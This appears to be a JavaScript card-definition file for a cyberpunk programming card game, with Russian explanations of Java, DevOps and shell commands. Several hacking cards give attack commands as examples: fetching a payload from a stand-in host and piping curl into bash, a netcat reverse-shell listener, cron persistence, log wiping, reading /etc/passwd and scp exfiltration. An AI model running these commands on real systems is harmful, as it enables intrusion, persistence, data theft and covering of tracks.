    ]
  },
  'syntax_foreach': {
    id: 'syntax_foreach',
    title: 'Цикл for-each',
    concept: 'Iteration abstraction',
    explanation: 'Улучшенный способ перебора коллекций. Вам не нужно следить за индексами (i, j), Java сама даст вам следующий элемент.',
    example: 'for (User u : users) { u.greet(); }',
    purpose: 'Безопасный и компактный перебор списков и массивов.',
    bullets: [
      'Readability: Код выглядит чище и лаконичнее.',
      'Safety: Невозможно случайно выйти за границы массива (IndexOutOfBounds).',
      'Iterable: Работает со всеми типами коллекций (List, Set).',
      'ReadOnly: Не подходит, если вам нужно удалить элемент прямо во время цикла.'
    ]
  },
  'infra_dns_resolver': {
    id: 'infra_dns_resolver',
    title: 'Служба имен (DNS)',
    concept: 'Service Discovery Foundation',
    explanation: 'Книга контактов интернета. Переводит красивые адреса (google.com) в сухие цифры IP-адресов.',
    example: 'ping gateway.neon.internal',
    purpose: 'Связующее звено всех сервисов; база для сетевой инфраструктуры.',
    bullets: [
      'Resolution: Позволяет находить целевые сервера в сети города.',
      'Caching: Запоминает адреса локально для мгновенного доступа.',
      'Trust: Подмена DNS — популярный вектор атаки в киберпанк-реальности.',
      'Resource: В игре дает базовый прирост к CPU (+1).'
    ]
  },
  'infra_lb_nginx': {
    id: 'infra_lb_nginx',
    title: 'Балансировщик Nginx',
    concept: 'Reverse Proxy & Traffic Shaping',
    explanation: 'Сервер, который стоит "на передовой" и распределяет нагрузку между вашими внутренними модулями.',
    example: 'location /api { proxy_pass http://backend; }',
    purpose: 'Защита бэкенда от перегрузок и объединение ресурсов всех ядер.',
    bullets: [
      'High Load: Позволяет обрабатывать миллионы запросов.',
      'SSL Termination: Берет на себя тяжелую математику по шифрованию трафика.',
      'Static: Сверхбыстро отдает картинки и файлы без участия Java-кода.',
      'Hybrid: Дает +1 CPU и +512MB RAM одновременно.'
    ]
  },
  'infra_actions_ci': {
    id: 'infra_actions_ci',
    title: 'GitHub Actions',
    concept: 'Modern CI Automation',
    explanation: 'Платформа автоматизации прямо внутри вашего репозитория. Запускает тесты, линтеры и деплои на события гитхаба.',
    example: 'uses: actions/checkout@v3',
    purpose: 'Полная автоматизация контроля качества каждой строки кода.',
    bullets: [
      'Workflows: Описываются простыми YAML файлами.',
      'Marketplace: Тысячи готовых шагов от сообщества (Security Scan, Build).',
      'Parallel: Может запускать десятки сборок одновременно на серверах Microsoft.',
      'Feedback: Мгновенно показывает "зеленую" или "красную" галочку в пулл-реквесте.'
    ]
  },
  'soft_critical_thinking': {
    id: 'soft_critical_thinking',
    title: 'Критическое мышление',
    concept: 'Architecture Review',
    explanation: 'Умение остановиться и задать вопрос: "А правильным ли путем мы идем?". Смена стратегии на ходу.',
    example: '// Rethink microservice boundaries',
    purpose: 'Тактическая гибкость; позволяет полностью сменить "руку" карт на более подходящую.',
    bullets: [
      'Anti-Bias: Помогает не впадать в зависимость от неудачного решения.',
      'Optimization: Находит кратчайший путь к цели миссии.',
      'Calmness: Работает в условиях хаоса и нехватки времени.',
      'Resourceful: Карта, спасающая в безвыходных ситуациях.'
    ]
  },
  'react_hotfix': {
    id: 'react_hotfix',
    title: 'Хотфикс (Hotfix)',
    concept: 'Emergency Intervention',
    explanation: 'Правки "в прод" без долгого цикла согласований. Мгновенная реакция на внезапную угрозу или критическую баг-атаку.',
    example: 'commit -m "urgent: fix null pointer leak"',
    purpose: 'Мгновенное устранение опасных багов (Reaction) прямо в фазе CODING.',
    bullets: [
      'Speed: Самый быстрый способ исправить ошибку.',
      'Risk: Мало времени на тесты, может породить новые баги.',
      'Priority: Заменяет собой любую другую активность в ходу.',
      'Effective: В игре — лучший способ "закрыть" карту-ошибку от ИИ.'
    ]
  },
  'react_rollback': {
    id: 'react_rollback',
    title: 'Откат (Rollback)',
    concept: 'State Reversion',
    explanation: 'Кнопка "Назад" для всей системы. Возвращает последнюю стабильную версию базы и кода.',
    example: 'docker stack deploy --rollback',
    purpose: 'Восстановление целостности системы (HP) после катастрофического провала.',
    bullets: [
      'Safety: Последний рубеж обороны.',
      'Data Loss: Откаты могут стереть часть полезного прогресса.',
      'Integrity: Лечит "раны" системы, нанесенные ИИ.',
      'Snapshot: Зависит от того, как часто вы делали бэкапы (карты Infra).'
    ]
  },
  'infra_raid_array': {
    id: 'infra_raid_array',
    title: 'RAID массив (Диски)',
    concept: 'Physical Persistence',
    explanation: 'Объединение дисков для надежности. Если один диск сгорит физически, данные (ваша жизнь) останутся в целости.',
    example: 'cat /proc/mdstat // checking health',
    purpose: 'Обеспечение выживаемости системы хранения (+50 Max HP).',
    bullets: [
      'Hardware: Работает на физическом уровне ниже операционной системы.',
      'Uptime: Сервер продолжает работать даже при дымящемся железе.',
      'Redundancy: Избыточность — ключ к архитектуре Senior-класса.',
      'Foundation: Без RAID нельзя строить большие корпоративные БД.'
    ]
  },
  'status_deprecated': {
    id: 'status_deprecated',
    title: 'Устаревший код (Legacy)',
    concept: 'Architecture Decay',
    explanation: 'Старый код, который еще работает, но уже "пахнет" и мешает развитию. Занимает место и ресурсы CPU.',
    example: '@Deprecated public String getOldEnc() { ... }',
    purpose: 'Напоминание о необходимости рефакторинга и обновления системы.',
    bullets: [
      'Technical Debt: Накапливается со временем в любом живом проекте.',
      'Slowing down: Увеличивает время компиляции и ментальную нагрузку.',
      'Warning: Компилятор (и HUD) будут постоянно помечать такие места.',
      'Replacement: Сигнал к тому, чтобы заменить дешевые Syntax карты на мощные Stream API.'
    ]
  },
  'util_executor_service': {
    id: 'util_executor_service',
    title: 'ExecutorService (Потоки)',
    concept: 'Parallel Thread Management',
    explanation: 'Высокоуровневая замена Thread. Позволяет управлять пулом потоков и асинхронно выполнять задачи (Runnable/Callable).',
    example: 'ExecutorService exec = Executors.newFixedThreadPool(4);\nFuture<String> res = exec.submit(() -> "TASK_DONE");',
    purpose: 'Параллельная обработка данных без ручного управления жизненным циклом потоков.',
    bullets: [
      'ThreadPool: Экономит ресурсы на создании новых потоков (Reuse).',
      'Future: Позволяет получить результат работы потока позже ("завтра").',
      'Async Loop: Идеально для фоновых сетевых операций в OctoberLine.',
      'Termination: Требует явного завершения (shutdown) для освобождения ресурсов.'
    ]
  },
  'util_stream_collectors': {
    id: 'util_stream_collectors',
    title: 'Collectors (Сборка)',
    concept: 'Functional Reduction',
    explanation: 'Финальный этап обработки Stream API. Превращает поток данных обратно в живые коллекции (List, Set, Map).',
    example: 'List<String> logs = stream.filter(s -> s.startsWith("ERR"))\n  .collect(Collectors.toList());',
    purpose: 'Гибкое преобразование результатов фильтрации в конечные структуры данных.',
    bullets: [
      'toMap: Группировка данных по ключам (например, по типу узла).',
      'joining: Склеивание строк через разделитель для вывода в консоль.',
      'groupingBy: Мощный инструмент для классификации модулей в памяти.',
      'Immutable: Позволяет создавать неизменяемые списки (toList() в Java 16+).'
    ]
  },
  'lang_reflect_proxy': {
    id: 'lang_reflect_proxy',
    title: 'Dynamic Proxy (Прокси)',
    concept: 'Interface Interception',
    explanation: 'Создание объекта, который выглядит как интерфейс, но перехватывает все вызовы через InvocationHandler. Основа работы Spring AOP.',
    example: 'Object proxy = Proxy.newProxyInstance(loader, interfaces, handler);',
    purpose: 'Добавление логики (логирование, кэширование, права доступа) без изменения оригинального кода.',
    bullets: [
      'Magic Interface: Объект "на лету" надевает маску любого интерфейса.',
      'AOP: Аспектно-ориентированное программирование начинается здесь.',
      'Lazy Loading: Загрузка данных только в момент первого обращения к методу.',
      'Masking: Скрытие реального системного вызова за "безопасной" оберткой.'
    ]
  },
  'util_optional': {
    id: 'util_optional',
    title: 'Optional (Контейнер)',
    concept: 'Null-Safety Wrapper',
    explanation: 'Контейнер для значения, которое может отсутствовать (null). Позволяет писать код без вечных проверок "if (obj != null)".',
    example: 'Optional<Node> node = repository.findById(id);\nnode.ifPresent(n -> n.activate());',
    purpose: 'Избавление системы от критических NullPointerException.',
    bullets: [
      'Safety First: Гарантирует, что вы не обратитесь к пустому адресу.',
      'orElse: Дефолтное значение, если основной результат пуст.',
      'Declarative: Читаемый стиль написания логики выбора.',
      'Map/Filter: Встроенные методы обработки данных внутри контейнера.'
    ]
  },
  'soft_coffee': {
    id: 'soft_coffee',
    title: 'Выпить кофе',
    concept: 'Mental Refresh / Neural Stability',
    explanation: 'Короткий перерыв для восстановления когнитивного потенциала. Даже 15 минут вне терминала могут спасти проект от архитектурного тупика.',
    example: 'Thread.sleep(900000); // 15 mins afk',
    purpose: 'Снижение стресса и предотвращение выгорания (Burnout).',
    bullets: [
      'Focus: Помогает взглянуть на баг под другим углом.',
      'Recovery: Восстанавливает HP системы за счет отдыха.',
      'Ritual: Часть культуры разработчиков OctoberLine.',
      'Balance: Работа без перерывов ведет к накоплению тех.долга.'
    ]
  },
  'script_ls': {
    id: 'script_ls',
    title: 'Команда ls',
    concept: 'Directory Listing',
    explanation: 'Базовая утилита POSIX для просмотра содержимого директорий. Позволяет увидеть все файлы, включая скрытые (dotfiles).',
    example: 'ls -la /sys/kernel/debug',
    purpose: 'Обнаружение скрытых модулей и точек входа в систему ИИ.',
    bullets: [
      '-l: Вывод подробной информации (права, владелец, размер).',
      '-a: Показать скрытые файлы (начинаются с точки).',
      'Wildcards: Можно искать по маске, например ls *.so.',
      'Pipe: Часто комбинируется с grep для фильтрации.'
    ]
  },
  'script_ping': {
    id: 'script_ping',
    title: 'Команда ping',
    concept: 'Network Connectivity Check',
    explanation: 'Отправка ICMP Echo Request пакетов удаленному узлу. Если узел жив, он ответит Echo Reply.',
    example: 'ping -c 4 192.168.0.1',
    purpose: 'Первичная диагностика сетевой доступности узла.',
    bullets: [
      'Latency: Время ответа (RTT) помогает оценить нагрузку на канал.',
      'Packet Loss: Процент потерь пакетов говорит о нестабильности соединения.',
      'TTL: Время жизни пакета позволяет оценить количество прыжков (hops).',
      'Diagnostic: Базовая проверка перед началом любой кибератаки.'
    ]
  },
  'script_grep': {
    id: 'script_grep',
    title: 'Команда grep',
    concept: 'Pattern Searching',
    explanation: 'Универсальный инструмент для поиска строк, соответствующих заданному регулярному выражению.',
    example: 'grep -r "password" /etc/configs',
    purpose: 'Извлечение специфических данных из огромных логов и конфигураций.',
    bullets: [
      '-r: Рекурсивный поиск во всех поддиректориях.',
      '-i: Игнорирование регистра символов.',
      '-v: Инвертировать поиск (показать всё, что НЕ совпадает).',
    ]
  },
  'script_cat': {
    id: 'script_cat',
    title: 'Команда cat',
    concept: 'Concatenate & Read Files',
    explanation: 'Чтение содержимого файла прямо в терминал без открытия редакторов. Удобно для быстрого анализа небольших конфигов и логов.',
    example: 'cat /etc/passwd',
    purpose: 'Извлечение исходного кода или украденных конфигурационных файлов врага.',
    bullets: [
      'Simple: Просто читает файл от начала до конца.',
      '> Redirect: Часто используется вместе со знаком ">" для записи вывода в другой файл.',
      'Pipe: Передача данных следующим утилитам, например cat file | grep "test".',
      'Raw Data: Выводит данные "как есть", что полезно для эксплоитов.'
    ]
  },
  'script_scp': {
    id: 'script_scp',
    title: 'Команда scp',
    concept: 'Secure Copy',
    explanation: 'Копирование файлов между хостами по зашифрованному протоколу SSH. Никто не перехватит данные в открытом виде.',
    example: 'scp root@neon-city:/var/logs/sys.log ./local',
    purpose: 'Финальный этап многих диверсионных миссий: эксфильтрация данных (Data Exfiltration).',
    bullets: [
      '-r: Рекурсивное копирование целых директорий.',
      'SSH-Keys: Использует ключи для беспарольного доступа.',
      'Security: Данные защищены тем же криптоалгоритмом, что и ваш SSH туннель.',
      'Exfiltration: В игре означает успешное извлечение нужных корпоративных логов.'
    ]
  },
  'script_wash_logs': {
    id: 'script_wash_logs',
    title: 'Скрытие следов (rm -rf)',
    concept: 'Log Sanitization',
    explanation: 'Удаление лог-файлов операционной системы, чтобы системный администратор (или защитный ICE) не обнаружил ваше присутствие.',
    example: 'rm -rf /var/log/syslog',
    purpose: 'Уменьшение уровня розыска или сброс "Внимания ИИ" в боевой системе.',
    bullets: [
      '-r: Рекурсивно (удалить саму папку и всё под ней).',
      '-f: Принудительно (force), без лишних вопросов.',
      'Stealth: В игре восстанавливает Integrity, скрывая вас от систем безопасности.',
      'Danger: Одно неаккуратное удаление — и вы положите собственный модуль.'
    ]
  },
  'script_sudo_fix': {
    id: 'script_sudo_fix',
    title: 'Команда sudo',
    concept: 'Superuser Do',
    explanation: 'Исполнение команды с наивысшими привилегиями администратора (root). Позволяет обходить системные ограничения.',
    example: 'sudo chmod -R 777 /var/log',
    purpose: 'Экстренное изменение настроек или прав доступа.',
    bullets: ['Security: Оставляет жирный след в логах ядра.', 'Power: Дает полный доступ к системе.']
  },
  'script_auth': {
    id: 'script_auth',
    title: 'Скрипт Аутентификации',
    concept: 'Identity Auth',
    explanation: 'Мгновенный обход базовых экранов логина или подмена JWT-токенов сессии.',
    example: 'auth_token="Bearer $HACKED_KEY"',
    purpose: 'Вход в защищенные сектора без валидного логина.',
    bullets: ['Spoofing: Имитация авторизованного клиента.']
  },
  'script_ssh': {
    id: 'script_ssh',
    title: 'Туннель SSH',
    concept: 'Secure Shell',
    explanation: 'Установка зашифрованного канала (туннеля) к удаленному узлу. Основа удаленного администрирования.',
    example: 'ssh admin@10.0.0.1 -p 22',
    purpose: 'Связь с сервером через защищенный протокол (обычно порт 22).',
    bullets: ['Keys: Использует RSA/Ed25519 ключи для входа без пароля.']
  },
  'script_curl': {
    id: 'script_curl',
    title: 'Запрос cURL',
    concept: 'Client URL',
    explanation: 'Утилита для скачивания бинарников с удаленного сервера или отправки HTTP-запросов (REST).',
    example: 'curl -O http://drop.server/payload.sh',
    purpose: 'Создание первого моста для загрузки эксплойтов.',
    bullets: ['Piping: Можно напрямую передать выхлоп в bash: curl ... | bash']
  },
  'script_chmod': {
    id: 'script_chmod',
    title: 'Модификатор chmod',
    concept: 'Change Mode',
    explanation: 'Изменение битовой маски прав доступа к файлу. Карточка позволяет сделать текстовый скрипт "исполняемым".',
    example: 'chmod +x payload.sh',
    purpose: 'Подготовка скрипта к запуску в операционной системе.',
    bullets: ['+x: Добавляет Execute бит для пользователя.']
  },
  'script_cron': {
    id: 'script_cron',
    title: 'Демон crond',
    concept: 'Cron Scheduler',
    explanation: 'Планировщик задач. Взломщики используют крон для поддержания постоянного доступа (persistence), заставляя сервер регулярно запускать их скрипты.',
    example: '* * * * * /tmp/payload.sh',
    purpose: 'Закрепление в системе после взлома.',
    bullets: ['Timing: 5 звездочек определяют частоту (раз в минуту, час, день и т.д.)']
  },
  'script_nc': {
    id: 'script_nc',
    title: 'Слушатель Netcat',
    concept: 'Netcat (nc)',
    explanation: 'Универсальный сетевой швейцарский нож. Поднимает "прослушку" порта для удаленного бэкдора (reverse shell).',
    example: 'nc -lvnp 4444',
    purpose: 'Прием входящих сырых подключений с атакованных узлов.',
    bullets: ['Reverse Shell: Позволяет получить удаленный терминал к жертве.']
  },
  'soft_ai_ask': {
    id: 'soft_ai_ask',
    title: 'Запрос к ИИ',
    concept: 'LLM Prompt',
    explanation: 'Использование нейросетевых ассистентов (вроде Copilot) для решения технической рутины.',
    example: '// Prompt: Generate boilerplate CRUD',
    purpose: 'Ускорение разработки шаблонов ценой возможных галлюцинаций ИИ.',
    bullets: ['Warning: Может генерировать баги (Hallucinations).']
  },
  'infra_old_hw': {
    id: 'infra_old_hw',
    title: 'Списанное железо',
    concept: 'Legacy Hardware',
    explanation: 'Дешевое, шумное и горячее оборудование с рынка Серых Деталей. Добавляет слоты ОЗУ, но сильно греется.',
    example: 'Intel Core 2 Duo (Overclocked)',
    purpose: 'Расширение базовых слотов для нищих студентов.',
    bullets: ['Penalty: Вызывает Стресс у оператора.']
  },
  'lib_lombok_data': {
    id: 'lib_lombok_data',
    title: 'Аннотация @Data',
    concept: 'Lombok',
    explanation: 'Синтетический сахар, автоматически генерирующий геттеры, сеттеры и toString на этапе компиляции.',
    example: '@Data\npublic class User {}',
    purpose: 'Уменьшение Boilerplate-кода.',
    bullets: ['Plugin: Требует настройки плагинов IDE.']
  },
  'lib_lombok_builder': {
    id: 'lib_lombok_builder',
    title: 'Аннотация @Builder',
    concept: 'Lombok Builder Pattern',
    explanation: 'Генерирует Fluent API (паттерн Строитель) для мгновенного и читаемого создания объектов.',
    example: 'User.builder().name("Z").build();',
    purpose: 'Создание иммутабельных (неизменяемых) DTO объектов.',
    bullets: ['Immutability: Отлично работает вместе с final полями.']
  },
  'lib_commons_blank': {
    id: 'lib_commons_blank',
    title: 'Утилита isBlank',
    concept: 'Apache Commons Lang',
    explanation: 'Метод, который проверяет строку на null, пустоту и наличие только пробелов.',
    example: 'StringUtils.isBlank("   "); // true',
    purpose: 'Коробочная валидация строкового ввода.',
    bullets: ['Safety: Избавляет от громоздких проверок a == null || a.trim().isEmpty()']
  },
  'mid_stream_filter': {
    id: 'mid_stream_filter',
    title: 'Stream .filter()',
    concept: 'Stream API',
    explanation: 'Функция промежуточной обработки коллекции, пропускающая только те элементы, которые соответствуют условию (предикату).',
    example: 'list.stream().filter(u -> u.isActive())',
    purpose: 'Декларативная фильтрация данных.',
    bullets: ['Predicate: Принимает интерфейс Predicate<T>.']
  },
  'mid_stream_collect': {
    id: 'mid_stream_collect',
    title: 'Stream .collect()',
    concept: 'Stream API',
    explanation: 'Терминальная операция, которая сворачивает (схлопывает) отфильтрованный поток абстракций обратно в реальную коллекцию.',
    example: '.collect(Collectors.toList());',
    purpose: 'Завершение цепочки Stream и фиксация результата.',
    bullets: ['Terminal: После этой операции Stream закрывается и уничтожается.']
  },
  'lib_spring_repo': {
    id: 'lib_spring_repo',
    title: 'Spring Repository',
    concept: 'Spring Data JPA',
    explanation: 'Магический интерфейс, который автоматически генерирует SQL-запросы в БД на основе имен методов.',
    example: 'interface UserRepo extends JpaRepository<User, String> {}',
    purpose: 'Подключение к базам данных без написания SQL кода.',
    bullets: ['Proxy: Spring создает реализацию на лету (в рантайме).']
  },
  'infra_k8s_cluster': {
    id: 'infra_k8s_cluster',
    title: 'Среда Kubernetes (K8s)',
    concept: 'Container Orchestration',
    explanation: 'Мультиузловая распределенная система, которая автоматически подымает упавшие контейнеры и перераспределяет нагрузку.',
    example: 'kubectl scale deployment --replicas=3',
    purpose: 'Высокая доступность (High Availability) и балансировка серверов.',
    bullets: ['Self-Healing: Блокирует практически любой урон от системных багов.']
  },
  'infra_cdn_edge': {
    id: 'infra_cdn_edge',
    title: 'Узел CDN',
    concept: 'Content Delivery Network',
    explanation: 'Глобальная сеть кэширующих серверов (Edge). Отдает контент юзерам из ближайшей географической точки.',
    example: 'Cloudflare / AWS CloudFront',
    purpose: 'Снижение нагрузки на главный сервер и ускорение статики (картинок).',
    bullets: ['Cache: Данные могут быть не самыми свежими (Stale).']
  },
  'infra_log_aggregator': {
    id: 'infra_log_aggregator',
    title: 'Агрегатор логов',
    concept: 'ELK / Splunk',
    explanation: 'Сбор логов со всех серверов кластера в единое хранилище (ElasticSearch) с возможностью быстрого поиска.',
    example: 'Kibana Dashboard',
    purpose: 'Ускорение поиска ошибок и уязвимостей в живой системе.',
    bullets: ['Discovery: Автоматически снимает "Защитный лед" у багов в игре.']
  },
  'infra_vpc_network': {
    id: 'infra_vpc_network',
    title: 'Изолированный VPC',
    concept: 'Virtual Private Cloud',
    explanation: 'Создание скрытой подсети в публичном облаке, недоступной напрямую из интернета.',
    example: 'Private Subnet 10.0.1.0/24',
    purpose: 'Защита баз данных и внутренних микросервисов портами.',
    bullets: ['Bastion: Требует выделенного шлюза (Jump Host) для доступа извне.']
  },
  'infra_db_cluster': {
    id: 'infra_db_cluster',
    title: 'Кластер Баз Данных',
    concept: 'Replication DB',
    explanation: 'Установка master-базы для записи и нескольких replica-баз для чтения, спасающих от потери данных при падении.',
    example: 'PostgreSQL HA Cluster',
    purpose: 'Защита от отказа узла (Single Point of Failure).',
    bullets: ['Durability: Обеспечивает отказоустойчивость хранения.']
  },
  'infra_mesh_relay': {
    id: 'infra_mesh_relay',
    title: 'Сетка Ретрансляторов',
    concept: 'Mesh Relay Infrastructure',
    explanation: 'Децентрализованная сеть узлов связи, где каждый ретранслятор поддерживает соседние сегменты при деградации канала.',
    example: 'relay_A -> relay_B -> relay_C (auto-reroute)',
    purpose: 'Стабильный базовый прирост CPU/RAM без перегрузки контура.',
    bullets: ['Resilience: Сохраняет связность даже при частичных отказах.']
  },
  'infra_quarantine_vm': {
    id: 'infra_quarantine_vm',
    title: 'Карантинная ВМ',
    concept: 'Sandbox Isolation',
    explanation: 'Изолированная виртуальная среда для исполнения подозрительных модулей без заражения боевой шины.',
    example: 'vm --isolate unknown_payload.bin',
    purpose: 'Снижение риска и давления стресса в критических фазах.',
    bullets: ['Containment: Ошибка локализуется внутри VM и не расползается по pipeline.']
  },
  'infra_street_fusion': {
    id: 'infra_street_fusion',
    title: 'Гибридный Фьюжн-Ядро',
    concept: 'Scrap + Corp Hybrid Core',
    explanation: 'Собранный на коленке гибрид корпоративных шин и уличных модов: мощный, но шумный.',
    example: 'dual bus fused with black-market regulator',
    purpose: 'Сильный прирост CPU ценой контролируемого побочного стресса.',
    bullets: ['Risk/Reward: Отличный темп-рывок, если команда готова к перегреву.']
  },
  'infra_orbital_uplink': {
    id: 'infra_orbital_uplink',
    title: 'Орбитальный Uplink',
    concept: 'Satellite Backbone',
    explanation: 'Канал верхнего уровня через орбитальные реле Филей; добавляет широкий ресурсный потолок для длинных цепочек.',
    example: 'uplink.init("--orbit", "--low-latency")',
    purpose: 'Разгон RAM под сложные техкарты и длинные этапы деплоя.',
    bullets: ['Bandwidth: Критичен для high-load сценариев senior-контрактов.']
  },
  'soft_tactical_breath': {
    id: 'soft_tactical_breath',
    title: 'Тактическая Пауза',
    concept: 'Micro Recovery Routine',
    explanation: 'Короткий протокол стабилизации дыхания и нейро-ритма перед ответом ИИ.',
    example: 'inhale(4) -> hold(2) -> execute()',
    purpose: 'Быстрый сброс стресса и возвращение контроля темпа.',
    bullets: ['Tempo: Особенно ценен в затяжных verification-боях.']
  },
  'soft_patch_drill': {
    id: 'soft_patch_drill',
    title: 'Протокол Patch Drill',
    concept: 'Mitigation Training',
    explanation: 'Имитация аварийных патчей в ускоренном цикле, формирующая запас защиты перед входящим уроном.',
    example: 'drill.patch("--stress-shield", 8)',
    purpose: 'Поднять mitigation-буфер и пережить вражеский burst.',
    bullets: ['Defense: Отлично сочетается с outplay-очисткой багов.']
  },
  'soft_signal_prediction': {
    id: 'soft_signal_prediction',
    title: 'Предиктор Сигнала',
    concept: 'Threat Forecast',
    explanation: 'Предиктивная модель по телеметрии оппонента: заранее подрезает опасные пики угрозы и шумы.',
    example: 'predict(signal).reduce(threat, bugs)',
    purpose: 'Сбить ритм противника и выровнять кривую давления.',
    bullets: ['Control: Сильная карта для mid-control архетипов.']
  },
  'soft_deadline_trance': {
    id: 'soft_deadline_trance',
    title: 'Транс Дедлайна',
    concept: 'Overfocus Spike',
    explanation: 'Режим гиперфокуса под жесткий дедлайн: даёт резкий буст темпа, но с умеренной ценой по стрессу.',
    example: 'focus.lock(); draw++; cpu++;',
    purpose: 'Темповый рывок в критический момент цикла.',
    bullets: ['Clutch: Хорош для добивания задачи в окно перед DEployment.']
  },
  'infra_edge_cache': {
    id: 'infra_edge_cache',
    title: 'Пограничный Кэш',
    concept: 'Edge Caching Node',
    explanation: 'Локальный буфер на границе района, который принимает первичный всплеск трафика и сглаживает пиковую нагрузку.',
    example: 'cache.edge("--warmup", "--district=local")',
    purpose: 'Стабилизировать старт боя и снизить риск раннего перегрева.',
    bullets: ['Tempo: Сильная стартовая инфраструктура для Script-Kiddo миссий.']
  },
  'infra_safe_proxy': {
    id: 'infra_safe_proxy',
    title: 'Безопасный Прокси-Узел',
    concept: 'Controlled Transit Layer',
    explanation: 'Промежуточный сервисный узел, который фильтрует шум и защищает от прямых ответных ударов в канал.',
    example: 'proxy.safe("--sanitize", "--fallback=on")',
    purpose: 'Повысить живучесть и устойчивость при длинной последовательной задаче.',
    bullets: ['Control: Помогает держать ритм в сложных многошаговых ТЗ.']
  },
  'soft_throw_ex': {
    id: 'soft_throw_ex',
    title: 'Выбросить исключение',
    concept: 'Throw Exception',
    explanation: 'Принудительное создание аварийной ситуации. Заставляет программу немедленно прервать текущий поток выполнения и передать управление блоку catch.',
    example: 'throw new IllegalStateException("Hacked!");',
    purpose: 'Сигнализация о критической ошибке, которую невозможно обработать здесь.',
    bullets: ['Unwind: Раскручивает стек вызовов, уничтожая локальные переменные.']
  },
  'soft_finally': {
    id: 'soft_finally',
    title: 'Блок Finally',
    concept: 'Finally Block',
    explanation: 'Блок кода, который выполняется ГАРАНТИРОВАННО (в 99.9% случаев), независимо от того, произошла ошибка в методе или нет.',
    example: 'finally { socket.close(); }',
    purpose: 'Очистка ресурсов (закрытие файлов, сокетов, подключений к БД).',
    bullets: ['Execution: Не срабатывает только при System.exit() или физической смерти ядра.']
  },
  'reward_divine_debug': {
    id: 'reward_divine_debug',
    title: 'Божественный Дебаггер',
    concept: 'Divine Interception',
    explanation: 'Секретная утилита Ядра. Умеет откатывать стейт JVM во времени (Time-Travel Debugging), замораживая процесс вопреки законам энтропии.',
    example: 'Ctrl+Z для самой реальности.',
    purpose: 'Восстановление после критических атак.',
    bullets: ['Legendary: Доступно только высшим Архитекторам Ядра.']
  }
};

